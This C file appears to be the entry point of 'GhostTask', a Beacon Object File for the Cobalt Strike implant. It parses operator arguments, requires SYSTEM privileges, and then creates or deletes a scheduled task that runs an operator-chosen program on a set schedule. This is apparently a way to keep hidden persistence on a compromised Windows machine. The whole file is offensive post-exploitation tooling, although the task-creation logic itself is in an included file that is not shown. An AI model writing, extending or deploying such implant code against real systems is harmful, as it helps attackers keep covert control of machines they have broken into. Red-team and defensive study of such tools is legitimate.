#include <windows.h>
#include <stdio.h>

void printoutput(BOOL done);

#define DYNAMIC_LIB_COUNT 2
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "ghost_task.c"

void go(char *args, int alen)
{
    datap parser;
    Arguments arguments;

    bofstart();

    BeaconDataParse(&parser, args, alen);

    if (!ParseArguments(&parser, &arguments))
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid arguments");
        printoutput(TRUE);
        bofstop();
        return;
    }

    if (!CheckSystem())
    {
        BeaconPrintf(CALLBACK_ERROR, "You have to run it as SYSTEM.");
        printoutput(TRUE);
        bofstop();
        return;
    }

    if (arguments.taskOperation == TaskAddOperation)
        AddScheduleTask(
            NULL,                   arguments.taskName,
            arguments.program,      arguments.argument,
            arguments.userName,     arguments.scheduleType,
            arguments.hour,         arguments.minute,
            arguments.second,       arguments.dayBitmap
        );
    else if (arguments.taskOperation == TaskDeleteOperation)
        DeleteScheduleTask(NULL, arguments.taskName);

    internal_printf("\nGhostTask completed.\n");
    printoutput(TRUE);
    bofstop();
}
